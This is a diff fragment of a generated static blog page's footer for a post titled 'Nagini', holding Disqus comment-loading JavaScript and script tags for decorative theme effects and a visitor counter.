+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2022/01/20/Nagini/index/'
+    this.page.identifier = '2022/01/20/Nagini/index/'
+    this.page.title = 'Nagini'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
